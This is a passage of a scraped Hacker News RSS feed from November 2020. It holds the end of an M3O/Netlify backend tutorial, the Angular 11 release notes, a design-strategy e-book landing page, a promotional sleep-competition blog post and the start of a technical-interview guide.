<p>Check they’re running using <code>micro status</code>. You should see the status progress through starting, building and running. 
If you want to see logs or anything related just do <code>micro logs posts</code> and the same for any other service by name.</p>

<h3 id="write-a-post-on-the-cli">Write a post on the CLI</h3>

<p>Once services are running they become immediately callable via the CLI as dynamic commands.</p>

<p>Save a quick post:</p>

<div><div><pre><code>micro posts save <span>--id</span><span>=</span>1 <span>--title</span><span>=</span><span>"My first post"</span> <span>--content</span><span>=</span><span>"This is pretty epic"</span>
</code></pre></div></div>

<p>List posts:</p>



<p>The same calls can be made over the API too, just have to know your namespace:</p>

<h3 id="call-it-via-the-http-api">Call it via the HTTP API</h3>

<p>Now here’s where it gets cool and more importantly what you’ll be calling from your frontend apps 
running on Netlify. First grab your namespace like earlier.</p>

<div><div><pre><code><span>$ </span>micro user namespace
random-example-namespace
</code></pre></div></div>

<p>Now just curl it like any other api</p>

<div><div><pre><code><span>$ </span>curl <span>-H</span> <span>"Micro-Namespace: random-example-namespace"</span> https://api.m3o.dev/posts/query
<span>{</span>
  <span>"posts"</span>: <span>[</span>
    <span>{</span>
      <span>"id"</span>: <span>"1"</span>,
      <span>"title"</span>: <span>"My first post"</span>,
      <span>"slug"</span>: <span>"my-first-post"</span>,
      <span>"content"</span>: <span>"This is pretty epic"</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The generic <code>api.m3o.dev</code> url requires us to pass in our namespace so we query our own service but 
every namespace also gets its own unique URL so you don’t have to worry about this in your frontend 
code. Just compose namespace + m3o.dev as <code>random-example-namespace.m3o.dev</code>.</p>

<div><div><pre><code><span>$ </span>curl https://random-example-namespace.m3o.dev/posts/query
<span>{</span>
  <span>"posts"</span>: <span>[</span>
    <span>{</span>
      <span>"id"</span>: <span>"1"</span>,
      <span>"title"</span>: <span>"My first post"</span>,
      <span>"slug"</span>: <span>"my-first-post"</span>,
      <span>"content"</span>: <span>"This is pretty epic"</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>That’s it! We now have the backend for our frontend running on M3O.</p>

<p>Let’s deploy the sample frontend to Netlify just for kicks.</p>

<h2 id="deploying-the-frontend-to-netlify">Deploying the frontend to Netlify</h2>

<p>The frontend is a simple angular app we’ve put together to validate the premise:</p>

<p><strong>Netlify for the frontend, Micro for the backend</strong></p>

<p>You can find the code in <a href="https://github.com/m3o/blog-frontend">github.com/m3o/blog-frontend</a> but 
we’ll walk you through the install now. The deploy settings for the site hosted under 
<a href="https://loving-goodall-44ee08.netlify.app/">loving-goodall-44ee08.netlify.app</a> are as follows:</p>

<h3 id="build-settings">Build settings</h3>

<center>
<img src="https://blog.m3o.com/assets/images/deploysettings.png">
</center>

<p><br>
You can copy the below settings for ease of use. Where you see ‘concert-celtic-uncover’ replace it with your namespace from <code>micro user namespace</code> on the CLI. 
We need this to know what backend API to call.</p>

<div><div><pre><code>Repository        github.com/m3o/blog-frontend
Base directory    Not set
Build command     sed -i 's/micro/concert-celtic-uncover/g' ./src/environments/environment.prod.ts &amp;&amp; ng build --prod &amp;&amp; cp ./src/assets/_redirects ./dist/blog-frontend
Publish directory dist/blog-frontend
</code></pre></div></div>

<p>As you can see, it’s the original <code>m3o/blog-frontend</code> being deployed in the example, but in your case <code>m3o</code> will be replaced with your fork. 
This is because Netlify asks for the permissions to the repo.</p>

<p>The build command is a bit involved, here is what it’s doing:</p>

<div><div><pre><code><span># Replace the micro namespace with your own</span>
<span>namespace</span><span>=</span><span>$(</span>micro user namespace<span>)</span>

<span>sed</span> <span>-i</span> <span>"s/micro/</span><span>$namespace</span><span>/g"</span> ./src/environments/environment.prod.ts

<span># It's an angular app, so we have to ng build</span>
ng build <span>--prod</span>

<span># Single page …</span></code></pre></div></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html">https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html</a></em></p>]]>
            </description>
            <link>https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068782</guid>
            <pubDate>Thu, 12 Nov 2020 11:44:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Angular 11]]>
            </title>
            <description>
<![CDATA[
Score 147 | Comments 190 (<a href="https://news.ycombinator.com/item?id=25068668">thread link</a>) | @amitport
<br/>
November 12, 2020 | https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7 | <a href="https://web.archive.org/web/*/https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><p><a href="https://medium.com/@markathompson?source=post_page-----74721b7952f7--------------------------------" rel="noopener"><img alt="Mark Techson" src="https://miro.medium.com/fit/c/96/96/1*2hqK0rVXWghtk_RLFx33oA.jpeg" width="48" height="48"></a></p></div></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Photo of a Torch Ginger by Jules Kremer" src="https://miro.medium.com/max/2368/0*55kr1t601sp22pkE" width="1184" height="1091" srcset="https://miro.medium.com/max/552/0*55kr1t601sp22pkE 276w, https://miro.medium.com/max/1104/0*55kr1t601sp22pkE 552w, https://miro.medium.com/max/1280/0*55kr1t601sp22pkE 640w, https://miro.medium.com/max/1400/0*55kr1t601sp22pkE 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*55kr1t601sp22pkE?q=20"></p></div></div></div><figcaption>Photo of a Torch Ginger by Jules Kremer</figcaption></figure><p id="1feb"><strong>Welcome to the Angular version 11 release.</strong></p><p id="1877">Version 11.0.0 is here and we’ve got some great updates for Angular developers everywhere. This release has updates across the platform including the framework, the CLI and components. Let’s dive in!</p><h2 id="1182">Updates on Operation Byelog</h2><p id="593b">When we shared <a href="https://angular.io/guide/roadmap" rel="noopener">Angular’s Roadmap</a>, one of the items was Operation Byelog where we committed to putting a significant engineering effort towards triaging issues and PRs until we have a clear understanding of the broader community needs. We can now report that the original goal is complete! We’ve triaged all the issues in all three of the monorepos and will continue this as an ongoing effort as new issues get reported.</p><p id="bc06">This is our commitment: Going forward all new issues reported will be triaged within 2 weeks.</p><p id="2104">In the process, we resolved a few <a href="https://github.com/angular/angular/issues/12842" rel="noopener">popular</a> <a href="https://github.com/angular/angular/issues/18469" rel="noopener">issues</a> in the <a href="https://github.com/angular/angular/issues/13011" rel="noopener">router</a> and <a href="https://github.com/angular/angular/issues/14542" rel="noopener">forms</a>.</p><p id="a1cd">Also, we’ve closed the <a href="https://github.com/angular/angular/issues/11405" rel="noopener"><em>third most popular issue</em></a><em>!</em></p><p id="5773">Now, we’re planning the next steps to support the Angular community. We’ll continue triaging and fixing issues, and work towards improving our processes for accepting community contributions.</p><h2 id="4683">Automatic Inlining of Fonts</h2><p id="6a67">To make your apps even faster by speeding up their <a href="https://web.dev/first-contentful-paint/" rel="noopener">first contentful paint</a>, we’re introducing automatic font inlining. During compile time Angular CLI will download and inline fonts that are being used and linked in the application. We enable this by default in apps built with version 11. All you need to do to take advantage of this optimization is update your app!</p><h2 id="124e">Component Test Harnesses</h2><p id="78d2">In Angular v9 we introduced Component Test Harnesses. They provide a robust and legible API surface to help with testing Angular Material components. It gives developers a way to interact with Angular Material components using the supported API during testing.</p><p id="2932">Releasing with version 11, we have harnesses for all of the components! Now developers can create more robust test suites.</p><p id="3e07">We’ve also included performance improvements and new APIs. The <em>parallel</em> function makes working with asynchronous actions in your tests easier by allowing developers to run multiple asynchronous interactions with components in parallel. The <em>manualChangeDetection</em> function gives developers access to finer grained control of change detection by disabling automatic change detection in unit tests.</p><p id="752c">For more details and examples of these APIs and other new features, be sure to check out the <a href="http://material.angular.io/cdk/test-harnesses/overview" rel="noopener">documentation for Angular Material</a> Test Harnesses!</p><h2 id="173a">Improved Reporting and Logging</h2><p id="968c">We’ve made changes to the builder phase reporting to make it even more helpful during development. We are bringing in new CLI output updates to make logs and reports easier to read.</p><figure><div><div><p><img alt="Screenshot of angular CLI output nicely formatted into columns." src="https://miro.medium.com/max/1214/0*-dCa80651cnfbjpX" width="607" height="355" srcset="https://miro.medium.com/max/552/0*-dCa80651cnfbjpX 276w, https://miro.medium.com/max/1104/0*-dCa80651cnfbjpX 552w, https://miro.medium.com/max/1214/0*-dCa80651cnfbjpX 607w" sizes="607px" data-old-src="https://miro.medium.com/max/60/0*-dCa80651cnfbjpX?q=20"></p></div></div><figcaption>Improved CLI output formatting</figcaption></figure><h2 id="970e">Updated Language Service Preview</h2><p id="650a">The Angular Language Service provides helpful tools to make development with Angular productive and fun. The current version of the language service is based on View Engine and today we’re giving a sneak peek of the Ivy-based language service. The updated language service provides a more powerful and accurate experience for developers.</p><p id="15e6">Now, the language service will be able to correctly infer generic types in templates the same way the TypeScript compiler does. For example, in the screenshot below we’re able to infer that the iterable is of type string.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Screenshot of intellisense style insights in Angular templates." src="https://miro.medium.com/max/3000/0*L1Tg13gdu3PCqUNN" width="1500" height="902" srcset="https://miro.medium.com/max/552/0*L1Tg13gdu3PCqUNN 276w, https://miro.medium.com/max/1104/0*L1Tg13gdu3PCqUNN 552w, https://miro.medium.com/max/1280/0*L1Tg13gdu3PCqUNN 640w, https://miro.medium.com/max/1400/0*L1Tg13gdu3PCqUNN 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*L1Tg13gdu3PCqUNN?q=20"></p></div></div></div><figcaption>Angular Language Service inferring iterable types in templates</figcaption></figure><p id="e67f">This powerful new update is still in development but we wanted to share an update as we keep preparing it for a full release in an upcoming version.</p><h2 id="48a5">Updated Hot Module Replacement (HMR) Support</h2><p id="303f">Angular has offered support for HMR but enabling it required configuration and code changes making it less than ideal to quickly include in Angular projects. In version 11 we’ve updated the CLI to allow enabling HMR when starting an application with ng serve. To get started, run the following command:</p><pre><span id="3ac4">ng serve --hmr</span></pre><p id="f3bc">After the local server starts the console will display a message confirming that HMR is active:</p><p id="f521">NOTICE: Hot Module Replacement (HMR) is enabled for the dev server.</p><p id="5155">See <a href="https://webpack.js.org/guides/hot-module-replacement" rel="noopener">https://webpack.js.org/guides/hot-module-replacement</a> for information on working with HMR for webpack.</p><p id="3796">Now during development the latest changes to components, templates and styles will be instantly updated into the running application. All without requiring a full page refresh. Data typed into forms are preserved as well as scroll position providing a boost to developer productivity.</p><h2 id="6de3">Faster Builds</h2><p id="630c">We’re bringing a faster development and build cycle by making updates to some key areas.</p><ul><li id="4336">When installing dependencies, the ngcc update process is now 2–4x faster.</li><li id="b30d">Faster compilation with TypeScript v4.0.</li></ul><p id="ed18">Now, teams can opt-in to webpack v5. Currently, you could experiment with <a href="https://webpack.js.org/concepts/module-federation/" rel="noopener">module federation</a>. In the future, webpack v5 will clear the path for:</p><ul><li id="db89">Faster builds with persistent disk caching</li><li id="7ab4">Smaller bundles thanks to <a href="https://webpack.js.org/guides/tree-shaking/" rel="noopener">cjs tree-shaking</a></li></ul><p id="dae8">Support is experimental and under development so we don’t recommend opting in for production uses.</p><p id="4ca8">Want to try out webpack 5? To enable it in your project, add the following section to your package.json file:</p><pre><span id="386c">"resolutions": {<br>     "webpack": "5.4.0"<br>}</span></pre><p id="65a0">Currently, you’ll need to use <strong>yarn</strong> to test this as npm does not yet support the resolutions property.</p><h2 id="d0a9">Linting</h2><p id="e4b2">In previous versions of Angular, we’ve shipped a default implementation for linting (TSLint). Now, TSLint is deprecated by the project creators who recommend migration to ESLint. <a href="https://twitter.com/mrjameshenry" rel="noopener">James Henry</a> together with other folks from the open-source community developed a third-party solution and migration path via <a href="https://github.com/typescript-eslint/typescript-eslint" rel="noopener">typescript-eslint</a>, <a href="https://github.com/angular-eslint/angular-eslint" rel="noopener">angular-eslint</a> and <a href="https://github.com/typescript-eslint/tslint-to-eslint-config" rel="noopener">tslint-to-eslint-config</a>! We’ve been collaborating closely to ensure a smooth transition of Angular developers to the supported linting stack.</p><p id="6071">We’re deprecating the use of TSLint and Codelyzer in version 11. This means that in future versions the default implementation for linting Angular projects will not be available.</p><p id="806d">Head over to the <a href="https://github.com/angular-eslint/angular-eslint#migrating-from-codelyzer-and-tslint" rel="noopener">official project page</a> for a guide to incorporate angular-eslint in a project and migrate from TSLint.</p><h2 id="98a6">Housekeeping</h2><p id="0727">In this update we’re removing support for IE9/IE10 and IE mobile. IE11 is the only version of IE <a href="https://angular.io/guide/browser-support" rel="noopener">still supported</a> by Angular. We’ve also <a href="https://angular.io/guide/deprecations" rel="noopener">removed deprecated APIs</a> and added a few to the deprecation list. Be sure to check this out to make sure you are using the latest APIs and following our recommended best practices.</p><h2 id="a3c7">Roadmap</h2><p id="9aad">We’ve also updated the <a href="https://angular.io/guide/roadmap" rel="noopener">roadmap</a> to keep you posted on our current priorities. Some of the announcements in this post are updates on in-progress projects from the roadmap. This reflects our approach to incrementally rollout larger efforts and allows developers to provide early feedback that we can incorporate it into the final release.</p><p id="8c07">We collaborated with <a href="https://twitter.com/simpulton" rel="noopener">Lukas Ruebbelke</a> from the Angular community on updating the content of some of the projects to better reflect the value they provide to developers.</p><h2 id="6939">How to update to get version 11</h2><p id="0170">When you are ready to go run this command to update Angular and CLI:</p><pre><span id="5983">ng update @angular/cli @angular/core</span></pre><p id="ac5f">Head over to <a href="https://update.angular.io/" rel="noopener">update.angular.io</a> to find detailed information and guidance on updating. We always recommend upgrading one major release at a time to have the best update experience.</p><p id="732f">We hope you enjoy this feature update and be sure to let us know what you think here or on <a href="https://twitter.com/angular" rel="noopener">Twitter</a>!</p></div></div></section></div></div>]]>
            </description>
            <link>https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068668</guid>
            <pubDate>Thu, 12 Nov 2020 11:19:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Linux Laptop Reviews]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068348">thread link</a>) | @manuanuragck
<br/>
November 12, 2020 | https://diode.zone/videos/watch/18caf3b3-bbc3-47eb-a394-eca1af079267 | <a href="https://web.archive.org/web/*/https://diode.zone/videos/watch/18caf3b3-bbc3-47eb-a394-eca1af079267">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://diode.zone/videos/watch/18caf3b3-bbc3-47eb-a394-eca1af079267</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068348</guid>
            <pubDate>Thu, 12 Nov 2020 10:15:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Essential Guide to Design Strategy]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068234">thread link</a>) | @mmanja
<br/>
November 12, 2020 | https://designstrategy.guide/the-ultimate-design-strategy-e-book/ | <a href="https://web.archive.org/web/*/https://designstrategy.guide/the-ultimate-design-strategy-e-book/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">

	
	

	
	<main id="main">
<div id="content" role="main">
	<div>
		<div>
			<div>
				
				
														
							<section id="section_1601225788">
		

		<div>
			
<div>
<p><img src="https://designstrategy.guide/wp-content/uploads/2020/03/white-layer.png"><br>
<img src="https://designstrategy.guide/wp-content/uploads/2020/10/bg-blurb.png"></p>
<div id="row-1134172727">

	

	

	<div id="col-1899091486">
		<div>
			
			
<h3>The Ultimate Design Strategy e-book</h3>
<p>Learn how to leverage design strategy to increase ROI, enhance your design’s value and much more.</p>
<p><a rel="noopener noreferrer" href="https://designstrategy.mykajabi.com/pl/237579" target="_blank">
    <span>CLAIM YOUR FREE COPY</span>
  </a>

		</p></div>
			</div>

	

	

	


</div>
		</div>

		

	</div></section>
	
	<section id="section_837033127">
		

		<div>
			
	<div>

		<div>
						<p><img width="1200" height="890" src="https://designstrategy.guide/wp-content/uploads/2020/11/Ipad-with-hand-small.gif" alt="DesignStrategyEbook" loading="lazy">											</p>
					</div>

		
	</div>
	
<div id="row-897570059">

	<div id="col-507029735">
		<div>
			
			
	<div id="image_153793019">
								<p><img width="1020" height="427" src="https://designstrategy.guide/wp-content/uploads/2020/10/longest-white-1024x429.png" alt="" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/10/longest-white-1024x429.png 1024w, https://designstrategy.guide/wp-content/uploads/2020/10/longest-white-300x126.png 300w, https://designstrategy.guide/wp-content/uploads/2020/10/longest-white-768x322.png 768w, https://designstrategy.guide/wp-content/uploads/2020/10/longest-white-600x251.png 600w, https://designstrategy.guide/wp-content/uploads/2020/10/longest-white.png 1181w" sizes="(max-width: 1020px) 100vw, 1020px">						
					</p>
								

	</div>
	
		</div>
			</div>

	
</div>
<div id="row-1015546968">

	<div id="col-757657548">
		<div>
			
			
<h2>Why am I giving<br>you this eBook for free?</h2>
<p>Plenty of designers and product managers feel lost and frustrated while trying to prove their product design’s value and making a tangible impact. I will show you how to leverage design strategy to raise your profit.</p>
<p>I BELIEVE THAT THERE ARE 4 THINGS TO FOCUS ON:</p>
		</div>
			</div>

	
</div>

<div id="row-2009548800">

	

	

	<div id="col-1166286938">
		<div>
			
			
<p>Embrace your<br>metrics and KPIs</p>

		</div>
			</div>

	


</div>
<div id="row-921106119">

	<div id="col-208058864">
		<div>
			
			
	<div id="image_1456523275">
								<p><img width="1020" height="505" src="https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-1024x507.png" alt="" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-1024x507.png 1024w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-300x148.png 300w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-768x380.png 768w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-600x297.png 600w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1.png 1144w" sizes="(max-width: 1020px) 100vw, 1020px">						
					</p>
								

	</div>
	
		</div>
			</div>

	
</div>
<div id="row-1444497161">

	<div id="col-1920893854">
		<div>
			
			
<h3><img loading="lazy" src="https://designstrategy.guide/wp-content/uploads/2020/11/03-cut-noshadow-SMALL.png" alt="The Design Strategy E-book" width="325" height="462" srcset="https://designstrategy.guide/wp-content/uploads/2020/11/03-cut-noshadow-SMALL.png 500w, https://designstrategy.guide/wp-content/uploads/2020/11/03-cut-noshadow-SMALL-211x300.png 211w" sizes="(max-width: 325px) 100vw, 325px"></h3>
<h3><span>Why and how? </span></h3>
<p><span>That’s what I unpack in the ebook.</span></p>
<p>It’s a bull***-free guide that’ll help you to create your design strategy, raise your conversion rates and implement better processes.</p>
		</div>
			</div>

	
</div>
<div id="row-1259149315">

	<div id="col-2087084750">
		<div>
			
			
	<div id="image_1622740667">
								<p><img width="1020" height="445" src="https://designstrategy.guide/wp-content/uploads/2020/10/line-white-1024x447.png" alt="" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/10/line-white-1024x447.png 1024w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-300x131.png 300w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-768x335.png 768w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-600x262.png 600w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white.png 1199w" sizes="(max-width: 1020px) 100vw, 1020px">						
					</p>
								

	</div>
	
		</div>
			</div>

	
</div>
<div id="row-1895652313">

	<div id="col-401713255">
		<p>
			
			
<h2>Goodies that come with this book</h2>
		</p>
			</div>

	
</div>
<div id="row-680839676">

	

	

	<div id="col-1977661704">
		<p>Research diagrams and insights</p>
		

	</div>

	
</div>
<div id="row-2118174865">

	

	

	<div id="col-994390605">
		<p>Links that’ll expand your knowledge</p>
		

	</div>

	
</div>

<div id="row-374012880">

	<div id="col-1752827751">
		<div>
			
			
	<div id="image_524845942">
								<p><img width="1020" height="505" src="https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-1024x507.png" alt="" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-1024x507.png 1024w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-300x148.png 300w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-768x380.png 768w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1-600x297.png 600w, https://designstrategy.guide/wp-content/uploads/2020/10/line2-white-1.png 1144w" sizes="(max-width: 1020px) 100vw, 1020px">						
					</p>
								

	</div>
	
		</div>
			</div>

	
</div>
		</div>

		

	</section>
	
	<section id="section_1113065041">
		

		<div>
			

<div id="row-438285656">

	<div id="col-1430784737">
		<div>
			
			
<p><span>It is an eye-opener for every designer.<br>
</span></p>
<p><span>Claudia, UX designer</span></p>
		</div>
			</div>

	

	

	

	<div id="col-663187787">
		<div>
			
			
<p><span>Too many startups fail because they don’t know which part they need to focus on (UX, dev, design). This e-book showed me new methods that I need to try out. </span></p>
<p><span>Jessica, Project Manager</span></p>
		</div>
			</div>

	
</div>
	
	
<div id="row-1365196352">

	<div id="col-535971456">
		<div>
			
			
<p><span>This book challenged my knowledge and showed me how and where to level up my design knowledge. Romina, thanks for choosing me to be part of your UX testing group. Plus, the design is just wow.<br></span></p>
<p><span>Monika, CMO</span></p>
		</div>
			</div>

	

	

	

	<div id="col-1158711882">
		<div>
			
			
<p><span>Now I know how to choose Design metrics. 🙂</span></p>
<p><span>Sara, Front-End Developer</span></p>
		</div>
			</div>

	
</div>
		</div>

		

	</section>
	
	<section id="section_2034668354">
		

		<div>
			
<div id="row-1278875072">

	<div id="col-1024907552">
		<div>
			
			
	<div id="image_336423174">
								<p><img width="1020" height="445" src="https://designstrategy.guide/wp-content/uploads/2020/10/line-white-1024x447.png" alt="" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/10/line-white-1024x447.png 1024w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-300x131.png 300w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-768x335.png 768w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white-600x262.png 600w, https://designstrategy.guide/wp-content/uploads/2020/10/line-white.png 1199w" sizes="(max-width: 1020px) 100vw, 1020px">						
					</p>
								

	</div>
	
		</div>
			</div>

	
</div>
<div id="row-1549708127">

	<div id="col-832569540">
		<div>
			
			
<h3><span>Meet the author</span></h3>
	
	
<div id="row-1249515476">

	<div id="col-1970846907">
		<div>
			
			
	<div id="image_110532660">
								<p><img width="682" height="1024" src="https://designstrategy.guide/wp-content/uploads/2020/11/03-682x1024.jpg" alt="Romina Kavcic Websi 2020" loading="lazy" srcset="https://designstrategy.guide/wp-content/uploads/2020/11/03-682x1024.jpg 682w, https://designstrategy.guide/wp-content/uploads/2020/11/03-200x300.jpg 200w, https://designstrategy.guide/wp-content/uploads/2020/11/03-768x1152.jpg 768w, https://designstrategy.guide/wp-content/uploads/2020/11/03-1024x1536.jpg 1024w, https://designstrategy.guide/wp-content/uploads/2020/11/03-600x900.jpg 600w, https://designstrategy.guide/wp-content/uploads/2020/11/03.jpg 1141w" sizes="(max-width: 682px) 100vw, 682px">						
					</p>
								

	</div>
	
		</div>
			</div>

	

	

	

	<div id="col-1078863444">
		<p><span>Romina is an award-winning Design Strategist who holds a Master of Business Administration. She has 15+ years of career experience in design work and consulting across both tech startups and several marquee tech unicorns such as Stellar.org, Outfit7, Databox, Xamarin, Chipolo, Singularity.NET, etc. She is currently advising, coaching and consulting with companies on design strategy &amp; management, visual design and user experience. Her work has been published on Forbes, Hackernews, Blockgeeks, Newsbtc, Bizjournals, and featured on Apple Store.</span></p>
			</div>

	
</div>
		</div>
			</div>

	
</div>
		</div>

		

	</section>
	

						
												</div>
		</div>
	</div>
</div>


</main><!-- #main -->

<!-- .footer-wrapper -->

</div></div>]]>
            </description>
            <link>https://designstrategy.guide/the-ultimate-design-strategy-e-book/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068234</guid>
            <pubDate>Thu, 12 Nov 2020 09:55:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Neurohacking the World Sleep Championships]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068156">thread link</a>) | @pedalpete
<br/>
November 12, 2020 | https://soundmind.co/blog/neurohacking-the-world-sleep-championships | <a href="https://web.archive.org/web/*/https://soundmind.co/blog/neurohacking-the-world-sleep-championships">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-e2b9e06d42ac6600e580"><div><p>I’m the last person you’d expect to compete in the <a href="https://www.worldsleepchampionships.com/">World Sleep Championships</a>. A life-long insomniac with Central Sleep Apnea, I’ve spent the last 10 months diving into the latest in neuroscience research with the goal of not only helping insomnia sufferers, but improving Sleep Performance for the greater population.&nbsp;</p><p>The competition used the data from Oura rings which classifies sleep as REM, light or deep, and factors in the number of hours you slept, how quickly you fell asleep, and how much time you spent in each sleep state.&nbsp;</p><h3>More people have died in their sleep than during any other activity, making this the most dangerous and extreme competition that has ever taken place! </h3><p>The organizers of the World Sleep Championships decided on a tournament type structure for the competition. We started with the seeding process to get our baseline sleep data, and build the competition tree. Seeding was followed by 5 alternating nights of head-to-head competition where the highest score for each pair of competitors made it through to the next round .</p><p>The only rule was that we couldn’t take sleeping pills, everything else was fair game. Rumour had it that sleep deprivation on non-competition nights was the strategy of choice for many competitors.</p><h3>I didn’t stoop to such tactics, instead relying on the SoundMind prototype to guide me through the competition.</h3><p>It started off very well, when I averaged the 2nd highest scores through seeding, and managed the 2nd highest score of 92 points on the first night of competition<br></p><p>I believed Oura was removing points for a low amount REM sleep as a percentage of my overall sleep, so I made an adjustment to the sounds played by SoundMind to promote more REM sleep. I had a hint that this would work, but, it was a bit like running a marathon in a new pair of sneakers. A wrong move and my competition would be over.</p><p>My competitor that night put in a very solid score of 93, and apparently began his celebrations early, before seeing the 96 points I achieved with the updated version of SoundMind. This turned out to be the highest score of the entire tournament.</p><p>This was followed-up by a score of 95 the next night of competition. Far above my pre-SoundMind average in the low 70s.</p><p>Going into the semi-finals, a win looked unlikely. At 2am, somebody rang the buzzer at my apartment, it was a food delivery guy who had the wrong address. When the buzzer rang a 2nd time at 2:30am, I was wondering if this was a new tactic my opponent had discovered as the only way to destroy my sleep and chances at winning the night. Waking up, I felt pretty good, but didn’t know if I’d have the high score to win with only 89 points. However, potentially my opponent's guilt over interfering in my sleep, if she actually had done this, kept her awake fretting, and I had a few points lead over her, which led me into the finals.</p><p>I felt confident going into the finals. Not only because of the high scores I had been seeing, but due to the consistency. Anybody can have one or two nights of great sleep, but to consistently be able to sleep great every night, that’s the real challenge, and also why the competition rewards the person who can get the high score night after night.</p><div><p>Potentially with a bit of nerves coming into play, I only managed to eke out a 93 on the final night, and I wasn’t sure if that would be enough to take the win from a man with a history of scoring in the low 90s. To add to the suspense, the competition takes place around the world, and living in Australia, we’re the 2nd country to be awake, so I had to wait a day to get the final results!</p><p>It was a close final, but I managed to win out by a mere 2 points! Though I don’t feel a strong need to give an acceptance speech or thank my sponsors, I do want to thank Damian and Todd for organizing the event, and to all my fellow competitors. </p><p>The most important result here for me is that we had a fun way to test out the SoundMind tech, and see it in action as more than just another score or another great night sleep. As I’ve been using SoundMind it’s been interesting to see how quickly I’ve adapted to just accepting that a good night sleep is what happens. I almost forget what it was like being awake all night, and the agony which comes with that.&nbsp;</p></div><p>We’ll have more updates, and be sharing more data as we progress, and sign-up to the wait list to reserve your spot and get one of the first headbands so you can have amazing sleep too!</p><p>Soon we’ll all be sleeping well with SoundMind.</p></div></div></div>]]>
            </description>
            <link>https://soundmind.co/blog/neurohacking-the-world-sleep-championships</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068156</guid>
            <pubDate>Thu, 12 Nov 2020 09:40:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Acing your technical interview – a hiring manager’s guide]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25067800">thread link</a>) | @ochronus
<br/>
November 12, 2020 | https://ochronus.online/acing-the-tech-interview/ | <a href="https://web.archive.org/web/*/https://ochronus.online/acing-the-tech-interview/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-605" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">
<div>

<div itemprop="text">

<p>Even though interviewing for a software engineering job can be intimidating and frustrating (with whiteboard exercises, remote coding challenges, and even full days of onsite interviews), it’s a lot easier when you know what to expect and are well-prepared.</p>
<p>I’ve interviewed a few hundred software engineering candidates in the past 10+ years and designed hiring processes. My experience is limited to startups and mid-sized companies, so take everything you read here with that in mind. My advice may not get you into Facebook or Google but will definitely increase your chances at mid-sized companies with a good culture!</p>
<p>In the first part of this article, I’ll give some context, then give you an actionable list to improve your experience and chances in your next interview</p>
<p>If you’re only interested in the actionable list, feel free to skip ahead to it.</p>

<h2 id="what-you-think-about-the-technical-interview-might-be-incomplete"><span id="What_you_think_about_the_technical_interview_might_be_incomplete">What you think about the technical interview might be incomplete</span></h2>
<p>First and foremost, a technical interview is almost never only technical. Up to a certain (and honestly, very useful!) level growing as a ‘coder’ is not that complicated. Many candidates perform pretty well if we purely look at their coding skills.</p>
